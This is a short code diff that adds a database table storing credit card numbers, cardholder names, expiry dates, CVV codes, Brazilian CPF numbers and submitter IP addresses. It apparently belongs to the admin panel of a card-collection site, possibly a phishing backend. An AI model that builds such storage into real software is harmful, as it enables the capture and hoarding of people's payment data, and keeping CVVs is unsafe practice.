@@ -47,6 +47,20 @@ def setup_db():
     )
     ''')
 
+    # Create cards table
+    cursor.execute('''
+    CREATE TABLE IF NOT EXISTS cards (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        card_number TEXT,
+        card_name TEXT,
+        expiry TEXT,
+        cvv TEXT,
+        cpf TEXT,
+        ip TEXT,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+    )
+    ''')
+
     # Insert default admin if not exists
     cursor.execute('SELECT id FROM users WHERE username = ?', ('admin',))
     if not cursor.fetchone():
